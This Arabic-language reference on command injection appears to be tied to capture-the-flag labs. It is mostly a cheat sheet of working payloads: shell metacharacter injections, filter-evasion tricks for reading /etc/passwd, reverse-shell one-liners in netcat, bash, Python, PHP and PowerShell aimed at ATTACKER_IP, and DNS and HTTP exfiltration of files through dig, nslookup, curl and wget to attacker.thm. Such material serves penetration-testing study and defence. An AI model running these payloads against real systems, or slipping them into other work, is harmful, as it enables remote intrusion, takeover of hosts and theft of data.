# Technical Reference & Deep Dive: Command Injection (مرجع تقني معمق)

---

## 1. تصنيف الرموز الخاصة في مفسرات الأوامر (Shell Metacharacters Taxonomy)

تعتمد أنظمة التشغيل ومفسرات الشل على رموز خاصة لربط وتوجيه الأوامر؛ استغلال هذه الرموز هو جوهر ثغرة حقن الأوامر:

| الرمز | بيئة التشغيل | الوظيفة الدلالية (Semantics) | مثال تطبيقي في الحقن |
| :---: | :---: | :--- | :--- |
| `;` | Linux / Unix | فاصل تسلسلي ينفذ الأمر التالي بغض النظر عن نجاح الأول. | `127.0.0.1; whoami` |
| `&` | Linux & Windows | يشغل الأمر الأول في الخلفية وينفذ الثاني فوراً. | `127.0.0.1 & whoami` |
| `&&` | Linux & Windows | ينفذ الأمر الثاني **فقط** إذا انتهى الأمر الأول بنجاح (`exit code 0`). | `127.0.0.1 && whoami` |
| `\|` | Linux & Windows | يمرر المخرجات القياسية للأمر الأول كمدخلات للأمر الثاني (Pipe). | `127.0.0.1 \| whoami` |
| `\|\|` | Linux & Windows | ينفذ الأمر الثاني **فقط** إذا فشل الأمر الأول (`exit code != 0`). | `invalid_ip \|\| whoami` |
| `\n` (`0x0a`) | Linux / Unix | سطر جديد (Newline) يفسره الشل كأمر مستقل جديد. | `127.0.0.1%0awhoami` |
| `` `cmd` `` | Linux / Unix | استبدال الأوامر (Command Substitution) بتنفيذ الأمر المضمن. | `echo `whoami`` |
| `$(cmd)` | Linux / Bash | استبدال الأوامر الحديث المفضل في بيئات Bash الحديثة. | `echo $(whoami)` |

---

## 2. مصفوفة الالتفاف على الفلاتر التكتيكية (Filter Evasion Cheat Sheet)

عندما يطبق المطور فلاتر تمنع المسافات أو تحظر أسماء ملفات معينة، يلجأ المهاجم إلى تقنيات الالتفاف المتقدمة:

### 2.1 الالتفاف على حظر المسافات (Bypassing Spaces)
* **استخدام متغير الفاصل الداخلي (Internal Field Separator - IFS) في لينكس:**
  ```bash
  cat$IFS/etc/passwd
  cat$IFS$9/etc/passwd
  cat${IFS}/etc/passwd
  ```
* **استخدام أقواس التجميع في Bash:**
  ```bash
  {cat,/etc/passwd}
  ```
* **إعادة التوجيه عبر الإدخال القياسي:**
  ```bash
  cat</etc/passwd
  ```

### 2.2 الالتفاف على حظر الكلمات المفتاحية (Bypassing Keyword Blacklists)
* **تقطيع السلاسل النصية بالاقتباسات الفارغة:**
  ```bash
  w'h'o'a'm'i
  w"h"o"a"m"i
  c\a\t /e\t\c/p\a\s\s\w\d
  ```
* **استخدام محارف البدل (Wildcards / Globbing):**
  ```bash
  /bin/c?t /etc/pass*
  /???/??t /???/p?ss??
  ```
* **التمرير عبر فك ترميز Base64 في الشل:**
  ```bash
  echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh
  ```
* **التمرير عبر السداسي عشري (Hexadecimal Decoding):**
  ```bash
  echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | xargs cat
  ```

---

## 3. دليل الاتصال العكسي الشامل (Reverse Shell Cheat Sheet)

بمجرد التحقق من ثغرة Command Injection، يكون الهدف الميداني التالي هو تثبيت اتصال تفاعلي عكسي (Reverse Shell):

### 3.1 حمولات لينكس الشائعة (Linux Payloads)
* **Netcat مع خيار التنفيذ `-e`:**
  ```bash
  nc -e /bin/sh ATTACKER_IP 4444
  ```
* **Netcat عبر الأنبوب المسمى (Named Pipe / OpenBSD Netcat):**
  ```bash
  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
  ```
* **Bash التفاعلي المباشر:**
  ```bash
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
  ```
* **Python Reverse Shell:**
  ```python
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
  ```
* **PHP Reverse Shell:**
  ```php
  php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

### 3.2 حمولات ويندوز (Windows Payloads)
* **PowerShell One-Liner Reverse Shell:**
  ```powershell
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  ```

---

## 4. تقنيات تسريب البيانات خارج النطاق في الحقن الأعمى (Blind OOB Exfiltration)

عندما يكون الحقن أعمى تماماً ولا يمكن كتابة ملفات في مسار الويب:
1. **التسريب عبر استعلامات الـ DNS (DNS Exfiltration):**
   ```bash
   dig $(whoami).attacker.thm
   nslookup $(cat /home/tryhackme/flag.txt | tr ' ' '_').attacker.thm
   ```
   يراقب المهاجم خادم الـ DNS المخصص له (مثل Burp Collaborator أو Interactsh) ويرى قيمة العلم واضحة في اسم النطاق الفرعي المطلوب!
2. **التسريب عبر استعلامات HTTP (HTTP Exfiltration):**
   ```bash
   curl -X POST -d @/home/tryhackme/flag.txt http://attacker.thm:8000/
   wget --post-data="$(whoami)" http://attacker.thm:8000/
   ```
